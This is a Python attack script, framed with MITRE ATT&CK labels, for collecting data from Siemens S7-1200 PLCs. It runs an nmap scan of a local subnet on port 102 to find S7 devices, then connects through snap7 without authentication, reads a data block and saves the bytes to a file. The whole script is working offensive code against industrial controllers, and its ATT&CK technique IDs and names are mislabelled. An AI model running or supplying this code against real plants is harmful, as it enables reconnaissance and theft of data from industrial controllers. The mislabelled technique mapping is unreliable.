import snap7
import socket
import struct
import subprocess
import re
import time

# MITRE ATT&CK Tactic: Collection (TA0009)
# Technique: Automated Collection (T1602)
# Sub-Technique: T1602.001 - Native APIs
# Target: Siemens S7-1200 PLC via S7comm protocol

# Configuration (Adjust as needed)
PLC_IP = None # Initially unknown.  Script will attempt to discover.
PLC_RACK = 0
PLC_SLOT = 1
DB_NUMBER = 1  # Example: Adjust based on your data block
START_ADDRESS = 0
BYTE_COUNT = 256 # Example: Adjust based on the amount of data you want to collect
SLEEP_TIME = 1 # Seconds to sleep before retrying IP discovery if unsuccessful

# Function to attempt to discover the PLC's IP address
def discover_plc_ip():
    """
    Attempts to discover the PLC's IP address by using the command-line tool 'nmap'
    to perform a network scan and identify Siemens S7 devices.  Requires nmap to be installed
    and in the system's PATH.  Returns the PLC's IP address as a string, or None if not found.
    """
    try:
        # Run nmap to scan for Siemens S7 devices
        # Adjust the network range (192.168.1.0/24) to match your network
        # The -sV option attempts to determine service/version information, which often reveals Siemens S7
        process = subprocess.Popen(['nmap', '-p102', '-sV', '192.168.1.0/24'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = process.communicate()
        output = stdout.decode('utf-8')

        # Use regular expression to find the PLC's IP address (look for Siemens S7 string)
        match = re.search(r'Nmap scan report for (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}).*Siemens S7', output, re.DOTALL)
        if match:
            ip_address = match.group(1)
            print(f"PLC IP address found: {ip_address}")
            return ip_address
        else:
            print("Siemens S7 PLC not found in nmap scan.")
            return None

    except FileNotFoundError:
        print("Error: nmap not found. Please ensure nmap is installed and in your system's PATH.")
        return None
    except Exception as e:
        print(f"Error during IP discovery: {e}")
        return None


def collect_data(plc_ip, rack, slot, db_number, start_address, byte_count):
    """
    Connects to the Siemens S7-1200 PLC, reads data from the specified Data Block (DB),
    and prints the collected data as a hex string.
    """
    try:
        plc = snap7.client.Client()
        plc.connect(plc_ip, rack, slot)

        # Read data from the PLC
        data = plc.db_read(db_number, start_address, byte_count)

        # Print the collected data as a hex string
        hex_data = ' '.join([f'{byte:02X}' for byte in data])
        print(f"Collected Data from DB{db_number}.DBB{start_address} (Length: {byte_count} bytes):\n{hex_data}")

        # (Optional) Save the collected data to a file
        with open("plc_data.hex", "w") as f:
            f.write(hex_data)
        print("Data saved to plc_data.hex")

        plc.disconnect()
        plc.destroy()

    except snap7.exceptions.Snap7Exception as e:
        print(f"Error communicating with the PLC: {e}")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")


if __name__ == "__main__":

    # Discover PLC IP if not manually configured
    if PLC_IP is None:
        print("Attempting to discover PLC IP address...")
        while True:
            PLC_IP = discover_plc_ip()
            if PLC_IP:
                break
            else:
                print(f"PLC IP discovery failed. Retrying in {SLEEP_TIME} seconds...")
                time.sleep(SLEEP_TIME)


    if PLC_IP:
        print(f"Using PLC IP: {PLC_IP}")
        collect_data(PLC_IP, PLC_RACK, PLC_SLOT, DB_NUMBER, START_ADDRESS, BYTE_COUNT)
    else:
        print("Failed to determine PLC IP address. Exiting.")